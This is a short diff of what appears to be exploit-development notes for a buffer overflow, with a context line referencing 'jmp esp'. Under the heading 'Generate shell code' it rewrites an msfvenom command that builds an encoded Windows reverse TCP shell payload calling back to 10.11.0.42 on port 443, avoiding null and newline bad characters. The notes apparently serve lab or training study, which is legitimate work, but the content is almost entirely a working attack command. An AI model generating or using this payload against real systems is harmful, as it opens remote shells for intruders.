@@ -61,5 +61,5 @@ nasm> jmp esp
 
 ## Generate shell code
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b “\x00\x0a\x0d” -e shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXITFUNC=thread
 ```
